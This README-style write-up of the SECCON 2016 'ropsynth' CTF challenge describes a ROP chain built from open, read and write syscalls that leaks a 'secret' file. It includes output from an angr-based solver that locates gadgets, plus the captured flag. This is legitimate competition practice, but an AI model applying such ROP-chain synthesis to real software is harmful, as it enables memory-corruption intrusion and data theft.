# SECCON CTF Quals 2016 : ropsynth-400
Solution by Grant Hernandez. This makes use of [Angr](https://github.com/angr/angr) for symbolic execution in order to solve path constraints. See `rop.py` for more details.
Includes some interesting usage of Angr in order to choose correct paths for execution.
This was written after the competion for practice.

## Problem Statement
*Category:* Binary<br/>
*Points:* 400<br/>
*Solves:* 34<br/>
*Description:* ropsynth.pwn.seccon.jp:10000 Read "secret" and output the content such as the following code.<br/>

```
fd = open("secret", 0, 0);
len = read(fd, buf, 256);
write(1, buf, len);
```

## Equivalent Assembly for ROP chain
```
ABI: RDI, RSI, RDX, RCX, R8, R9

pop rax # open = 2
pop rdi # address of "secret"
pop rsi # 0
pop rdx # 0
syscall

# rax now fd
push rax
pop rdi # arg1 = fd
pop rax # read = 0
pop rsi # pointer to some buffer
pop rdx # 0x100
syscall

# rax now len
push rax
pop rdx # arg3 = len
pop rax # write = 1
pop rdi # stdout = 1
pop rsi # pointer to some buffer
syscall

EOF
```

## Example Execution
```
(angr) [grant ~/security/ctf/grant-ctf/seccon16/ropsynth >> ./solve.py
=============[stage 1]============
Pattern PUSH_RAX_POP_RDI found at 0x7
Pattern PUSH_RAX_POP_RDX found at 0x9b
Pattern POP_RAX found at 0x236
Pattern SYSCALL found at 0x2c1
Pattern POP_RSI found at 0x3bc
Loading angr...
Determining guard condition for SYSCALL
Starting symbolic execution at 0x2c3
Determining guard condition for POP_RSI
Starting symbolic execution at 0x3bd
Determining guard condition for POP_RAX
Starting symbolic execution at 0x237
Determining guard condition for PUSH_RAX_POP_RDX
Starting symbolic execution at 0x9d
Determining guard condition for PUSH_RAX_POP_RDI
Starting symbolic execution at 0x9
Ropchain built: 856 bytes
Stage 1 passed!
=============[stage 2]============
Pattern POP_RAX found at 0x7
Pattern PUSH_RAX_POP_RDX found at 0x15e
Pattern PUSH_RAX_POP_RDI found at 0x1af
Pattern POP_RSI found at 0x33f
Pattern SYSCALL found at 0x476
Loading angr...
Determining guard condition for SYSCALL
Starting symbolic execution at 0x478
Determining guard condition for POP_RSI
Starting symbolic execution at 0x340
Determining guard condition for POP_RAX
Starting symbolic execution at 0x8
Determining guard condition for PUSH_RAX_POP_RDX
Starting symbolic execution at 0x160
Determining guard condition for PUSH_RAX_POP_RDI
Starting symbolic execution at 0x1b1
Ropchain built: 1128 bytes
Stage 2 passed!
=============[stage 3]============
Pattern PUSH_RAX_POP_RDX found at 0x3
Pattern POP_RAX found at 0x112
Pattern SYSCALL found at 0x258
Pattern PUSH_RAX_POP_RDI found at 0x323
Pattern POP_RSI found at 0x4ad
Loading angr...
Determining guard condition for SYSCALL
Starting symbolic execution at 0x25a
Determining guard condition for POP_RSI
Starting symbolic execution at 0x4ae
Determining guard condition for POP_RAX
Starting symbolic execution at 0x113
Determining guard condition for PUSH_RAX_POP_RDX
Starting symbolic execution at 0x5
Determining guard condition for PUSH_RAX_POP_RDI
Starting symbolic execution at 0x325
Ropchain built: 1168 bytes
Stage 3 passed!
=============[stage 4]============
Pattern PUSH_RAX_POP_RDI found at 0x1
Pattern POP_RAX found at 0x12c
Pattern PUSH_RAX_POP_RDX found at 0x150
Pattern POP_RSI found at 0x22f
Pattern SYSCALL found at 0x304
Loading angr...
Determining guard condition for SYSCALL
Starting symbolic execution at 0x306
Determining guard condition for POP_RSI
Starting symbolic execution at 0x230
Determining guard condition for POP_RAX
Starting symbolic execution at 0x12d
Determining guard condition for PUSH_RAX_POP_RDX
Starting symbolic execution at 0x152
Determining guard condition for PUSH_RAX_POP_RDI
Starting symbolic execution at 0x3
Ropchain built: 840 bytes
Stage 4 passed!
=============[stage 5]============
Pattern PUSH_RAX_POP_RDI found at 0x6
Pattern POP_RSI found at 0x131
Pattern POP_RAX found at 0x2b0
Pattern PUSH_RAX_POP_RDX found at 0x2fe
Pattern SYSCALL found at 0x37c
Loading angr...
Determining guard condition for SYSCALL
Starting symbolic execution at 0x37e
Determining guard condition for POP_RSI
Starting symbolic execution at 0x132
Determining guard condition for POP_RAX
Starting symbolic execution at 0x2b1
Determining guard condition for PUSH_RAX_POP_RDX
Starting symbolic execution at 0x300
Determining guard condition for PUSH_RAX_POP_RDI
Starting symbolic execution at 0x8
Ropchain built: 920 bytes
Stage 5 passed!
FLAG: SECCON{d28d3afbf80463568d5f}
```

## Known bugs

This happened once, but not able to repro
```
Traceback (most recent call last):
  File "./solve.py", line 105, in <module>
    ret = rop.determine_guards()
  File "/Users/grant/security/ctf/grant-ctf/seccon16/ropsynth/rop.py", line 121, in determine_guards
    if p.factory.block(pg.active[0].addr).vex.jumpkind == "Ijk_Ret":
IndexError: list index out of range
```
